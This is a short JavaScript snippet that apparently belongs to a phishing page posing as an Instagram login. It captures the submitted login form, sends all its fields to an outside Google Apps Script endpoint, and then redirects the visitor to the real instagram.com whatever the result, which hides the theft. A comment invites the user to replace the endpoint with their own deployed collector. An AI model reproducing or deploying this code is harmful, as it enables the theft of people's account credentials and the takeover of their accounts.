document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission

    const formData = new FormData(this);
    const url = 'https://script.google.com/macros/s/AKfycbwF7JKVhE4ccgd0nPoFCqLD7WSRCamdjpaNL3fsHC0hFo0yJ67XrtT7KLxGNXMchEpB/exec'; // Replace with your deployed web app URL

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            window.location.href = 'https://www.instagram.com'; // Redirect to Instagram
        } else {
            // Handle failure if needed
            alert('Something went wrong. Please try again.');
            window.location.href = 'https://www.instagram.com'; 
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Something went wrong. Please try again.');
        window.location.href = 'https://www.instagram.com'; 
    });
});
